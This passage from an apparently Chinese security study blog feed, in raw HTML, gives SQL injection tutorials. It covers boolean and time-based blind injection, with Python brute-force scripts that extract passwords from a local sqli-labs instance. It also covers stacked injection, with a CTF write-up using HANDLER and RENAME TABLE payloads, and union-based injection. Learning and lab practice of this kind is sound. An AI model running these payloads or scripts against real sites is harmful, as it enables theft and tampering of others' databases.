group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="6-逐字猜解记录数据"><a href="#6-逐字猜解记录数据" class="headerlink" title="6.逐字猜解记录数据"></a>6.逐字猜解记录数据</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>字段名<span class="token punctuation">)</span> <span class="token keyword">from</span> 表名<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#还可以采用python脚本的形式来进行爆破</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/sqli/Less-5/'</span><span class="token comment"># select = 'select database()'     #数据库  security</span><span class="token comment"># select = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'    #表名  emails,referers,uagents,users</span><span class="token comment"># select  = "select group_concat(column_name) from information_schema.columns where table_name='users'"   #字段名  user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span>select <span class="token operator">=</span> <span class="token string">"select group_concat(password) from users"</span>     <span class="token comment">#字段内容</span>result<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"-1' or ord(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>select<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">'?id='</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'You are'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            result<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">125</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-布尔盲注的一些函数"><a href="#3-布尔盲注的一些函数" class="headerlink" title="3.布尔盲注的一些函数"></a>3.布尔盲注的一些函数</h4><h5 id="1-substr-函数"><a href="#1-substr-函数" class="headerlink" title="1.substr()函数"></a>1.substr()函数</h5><p>substr(str,pos,len)   表示截取字符串str  从pos这位置截取len个字符</p><p>如果过滤了逗号</p><p>SELECT SUBSTR(‘2018-08-17’ FROM 6 FOR 5);</p><h5 id="2-mid"><a href="#2-mid" class="headerlink" title="2.mid()"></a>2.mid()</h5><p>mid(str,pos,len)    表示截取字符串str  从pos这位置截取len个字符  用法与substr类似</p><h5 id="3-right-函数"><a href="#3-right-函数" class="headerlink" title="3.right()函数"></a>3.right()函数</h5><p>right(str,len)    表示从字符串的最右面截取len个字符</p><pre class="line-numbers language-none"><code class="language-none">技巧是结合ascii()ascii(‘str’) 返回字符串的第一个字符的ascii码 能用ascii时尽量用ascii! 因为字符的比较可能因为字符比较特殊(比如是单引号)而出现很多问题，但是ascii直接转成数字，就解决了这个问题！ascii的同名函数是ord 用于过滤ascii的过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-trim-函数"><a href="#4-trim-函数" class="headerlink" title="4.trim()函数"></a>4.trim()函数</h5><pre class="line-numbers language-none"><code class="language-none">SQL trim() 函数 过滤指定的字符串,最常见的用途是移除字首或字尾的空白。MySQL: TRIM( ), RTRIM( ), LTRIM( )TRIM() #删除前后空格RTRIM() #删除字符串结尾空格LTRIM() #删除字符串起始空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">TRIM([BOTH&#x2F;LEADING&#x2F;TRAILING] 目标字符串 FROM 源字符串）如果&#x3D;用regexp替代 那么正确的字符一定在regexp前面 以这个abcd为例Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="5-insert"><a href="#5-insert" class="headerlink" title="5.insert()"></a>5.insert()</h5><pre class="line-numbers language-none"><code class="language-none">Insert(字符串，起始位置，长度，替换为什么)abc从第一位也就是a开始后的两位(ab)替换为xx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662302958057.png" alt="1662302958057"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">insert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">insert</span><span class="token punctuation">(</span><span class="token string">'abcdef'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">99999</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303054792.png" alt="1662303054792"></p><h5 id="6-比较字符串"><a href="#6-比较字符串" class="headerlink" title="6.比较字符串"></a>6.比较字符串</h5><p>当字符串比较时是按位比较的</p><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303178229.png" alt="1662303178229"></p><h5 id="7-like"><a href="#7-like" class="headerlink" title="7.like"></a>7.like</h5><pre class="line-numbers language-none"><code class="language-none">我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我 们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。WHERE 子句中可以使用等号 &#x3D; 来设定获取数据的条件，如 &quot;runoob_author &#x3D; &#39;RUNOOB.COM&#39;&quot;。 但是有时候我们需要获取 runoob_author 字段含有 &quot;COM&quot; 字符的所 有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或 正则表达式中的星号 *。 如果没有使用百分号 %, LIKE 子句与等号 &#x3D; 的效果是一样的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303301148.png" alt="1662303301148"></p><h5 id="8-正则表达式-regexp-rlike"><a href="#8-正则表达式-regexp-rlike" class="headerlink" title="8.正则表达式 regexp rlike"></a>8.正则表达式 regexp rlike</h5><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303405311.png" alt="1662303405311"></p><pre class="line-numbers language-none"><code class="language-none">regexp是不区分大小写的，需要大小写敏感 需要加上binary关键字<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303431365.png" alt="1662303431365"></p><h5 id="9-between"><a href="#9-between" class="headerlink" title="9.between"></a>9.between</h5><pre class="line-numbers language-none"><code class="language-none">expr [NOT] BETWEEN begin_expr AND end_expr;between筛选的是 expr &gt;&#x3D; begin_expr并且 expr &lt;&#x3D; end_expr 的数据，如果不存 在则返回的是0；not between筛选的是 expr &lt; begin_expr或者 expr &gt; end_expr 的数据，如果不 存在则返回的是0； 如果 expr 返回的是 NULL，则between 也返回的是null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303596097.png" alt="1662303596097"></p><h5 id="10-in"><a href="#10-in" class="headerlink" title="10.in"></a>10.in</h5><pre class="line-numbers language-none"><code class="language-none">依然是大小写不敏感的 字符数字都可用 也有not in<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303642507.png" alt="1662303642507"></p><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><h4 id="1-延时盲注的介绍"><a href="#1-延时盲注的介绍" class="headerlink" title="1.延时盲注的介绍"></a>1.延时盲注的介绍</h4><p>在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这 种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。既无论用户输入什么页面都是下面这种</p><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230641480.png" alt="image-20221210230641480"></p><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230656871.png" alt="image-20221210230656871"></p><h4 id="2-延时盲注的攻击流程"><a href="#2-延时盲注的攻击流程" class="headerlink" title="2.延时盲注的攻击流程"></a>2.延时盲注的攻击流程</h4><h5 id="1-延时盲注的判断"><a href="#1-延时盲注的判断" class="headerlink" title="1.延时盲注的判断"></a>1.延时盲注的判断</h5><p>由于没有任何的回显内容，所以无法通过查看回显的方法判断是否存在注入，可以使用1 and sleep(5)或 者1’ and sleep(5)#进行测试，如果页面执行有延迟，说明存在漏洞，</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">#数字型</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">#';#字符型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="2-获取数据库长度-1"><a href="#2-获取数据库长度-1" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><p>可以使用if语句进行判断，语法格式：if(expr1, expr2, expr3)：判断语句 如果第一个语句正确就执行第 二个语句，否则执行第三个语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果有延时说明数据库长度就是8</p><h5 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(substr(database(),1,1)='</span>s'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者利用ascii函数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">and</span><span class="token operator">%</span><span class="token number">20</span>if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4.获取表名"></a>4.获取表名</h5><p>可以先获取表的数量</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">id&#x3D;1&#39; and if((select count(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot;)&#x3D;4,sleep(5),1)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后获取每个表的长度</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再然后获取表的名称</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">101</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="5-获取字段名"><a href="#5-获取字段名" class="headerlink" title="5.获取字段名"></a>5.获取字段名</h5><h5 id="6-获取字段内容"><a href="#6-获取字段内容" class="headerlink" title="6.获取字段内容"></a>6.获取字段内容</h5><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsurl<span class="token operator">=</span><span class="token string">"http://127.0.0.1/sqli/Less-9/?id=1' and "</span><span class="token comment"># select = 'select database()'   #数据库  security</span><span class="token comment"># select = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'   #表名  emails,referers,uagents,users</span><span class="token comment"># select = "select group_concat(column_name) from information_schema.columns where table_name='emails'"            #字段名</span>select <span class="token operator">=</span> <span class="token string">"select group_concat(email_id) from emails"</span>   <span class="token comment">#字段内容</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if((ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>select<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">),sleep(3),1)--+"</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">125</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆叠注入</title>
      <link href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre class="line-numbers language-none"><code class="language-none">MySQL可以执行多条语句，多条语句之前用;做分隔。 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法 执行其他恶意语句，如RENAME、DROP等，堆叠注入可以用于执行任何SQL语句。 并不是所有情况下都可以使用堆叠注入需要满足条件$mysqli-&gt;multi_query($sql);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返 回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键 字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="当select被过滤了用handler来绕过"><a href="#当select被过滤了用handler来绕过" class="headerlink" title="当select被过滤了用handler来绕过"></a>当select被过滤了用handler来绕过</h3><pre class="line-numbers language-none"><code class="language-none">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一 行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。条件：堆叠注入handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表&#x2F;句柄的首行数据 handler hd read next; #读取指定表&#x2F;句柄的下一行数据handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]随便注</p><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190616986.png" alt="1662190616986"></p><p>输入  1’</p><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190675022.png" alt="1662190675022"></p><p>报错说明存在sql注入漏洞</p><p>输入   1’ order by 3#时</p><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190776274.png" alt="1662190776274"></p><p>说明select语句里有两个字段</p><p>然后尝试用联合注入获取数据库名</p><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190923197.png" alt="1662190923197"></p><p>发现select被过滤了然后用堆叠注入的方法获得表名</p><pre class="line-numbers language-none"><code class="language-none">1&#39;;show tables;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191211421.png" alt="1662191211421"></p><p>得到两个表 然后分别查询两个表中的字段</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191442844.png" alt="1662191442844"></p><p>这里发现有个 flag</p><p>第一种方法：</p><p>所以只需   select flag from <code>1919810931114514</code>;#   但是select被过滤了所以要用handler1</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">open</span><span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191646739.png" alt="1662191646739"></p><p>第二种方法：</p><pre class="line-numbers language-none"><code class="language-none">1&#39;;show columns from &#96;words&#96;;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662206518828.png" alt="1662206518828"></p><p>发现了   id    data   这两个字段</p><p>可以</p><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，把flag改为id</p><pre class="line-numbers language-none"><code class="language-none">1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words2&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">1&#39; or 1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662208984049.png" alt="1662208984049"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>union联合注入</title>
      <link href="/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1.判断是否存在漏洞"></a>1.判断是否存在漏洞</h3><p>用单引号或者双引号判断是否报错。若报错则存在sql注入漏洞</p><h3 id="2-判断是字符型的还是数字型漏洞"><a href="#2-判断是字符型的还是数字型漏洞" class="headerlink" title="2.判断是字符型的还是数字型漏洞"></a>2.判断是字符型的还是数字型漏洞</h3><p>输入    </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果与原来只输入  1   的结果相同则是数字</p><h3 id="3-判断select几列"><a href="#3-判断select几列" class="headerlink" title="3.判断select几列"></a>3.判断select几列</h3><p>用  order  by</p><p>如果order by  被过滤了可以用group by</p><h3 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h3><p>假设这里select的是3列  然后需要自己在判断一下哪几位是回显位  然后用联合注入查询 数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h3><pre class="line-numbers language-none"><code class="language-none">在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表， 表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际 上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果 取之此表。TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的 结果取之此表。COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-查询字段中的内容"><a href="#7-查询字段中的内容" class="headerlink" title="7.查询字段中的内容"></a>7.查询字段中的内容</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token keyword">from</span> biaoming<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>group_concat()  函数是让多行数据在一行显示   